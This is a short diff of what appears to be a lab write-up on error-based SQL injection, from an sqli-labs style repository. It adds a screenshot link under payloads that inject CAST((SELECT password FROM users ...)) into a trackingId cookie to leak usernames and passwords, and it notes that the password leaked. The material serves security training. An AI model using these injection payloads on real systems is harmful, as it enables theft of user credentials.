@@ -70,6 +70,8 @@ trackingId=MTHshxABbU9laks5' AND 1=CAST((SELECT username FROM users) AS int )--
 ```
 ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 ```
+![image](https://github.com/Renat9s/sqli-labs/assets/126417250/d299dc5a-db14-4532-a703-a06a793c9e28)
+
 
 - yes he did , Leaked the password also.
 --------------------------------------------------------------------------
